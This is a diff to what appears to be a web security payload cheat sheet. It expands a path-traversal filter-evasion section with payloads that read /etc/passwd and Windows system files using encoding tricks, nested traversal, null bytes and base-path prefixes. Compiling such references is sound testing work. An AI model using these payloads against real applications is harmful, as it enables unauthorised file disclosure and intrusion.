@@ -135,17 +135,30 @@ file.php%00.txt  # Null byte (PHP <5.3, may truncate .txt extension)
 
 ### Filter evasion
 ```
-URL encoding:
-  ..%2f..%2fetc%2fpasswd
+Absolute path (no traversal sequences):
+  /etc/passwd
+  C:\windows\system32\drivers\etc\hosts
+
+Nested traversal (..//):
+  ....//....//....//etc/passwd  # After stripping .., becomes ../
+  ....\\....\\....\\windows\\win.ini  # Windows variant
+
+URL encoding (single decode):
+  ..%2f..%2fetc%2fpasswd  # %2f = /
+  ..%5c..%5cwindows%5cwin.ini  # %5c = \
   
-Double encoding:
-  ..%252f..%252fetc%252fpasswd
+Double URL encoding (decoded twice):
+  ..%252f..%252fetc%252fpasswd  # First: %252f→%2f, Second: %2f→/
   
-Unicode encoding:
-  ..%c0%af..%c0%afetc%c0%afpasswd
+Non-standard encodings:
+  ..%c0%af..%c0%afetc%c0%afpasswd  # UTF-8 encoded /
+  ..%ef%bc%8f..%ef%bc%8fetc%ef%bc%8fpasswd  # Fullwidth slash
   
-Backslash (Windows):
-  ..\..\..\windows\system32\drivers\etc\hosts
+Null byte (legacy, PHP <5.3):
+  ../../../etc/passwd%00.jpg  # %00 terminates before .jpg
+
+Base folder prefix (if app requires it):
+  /var/www/images/../../../etc/passwd  # Contains required base directory
 ```
 
 ## NoSQL Injection (MongoDB)
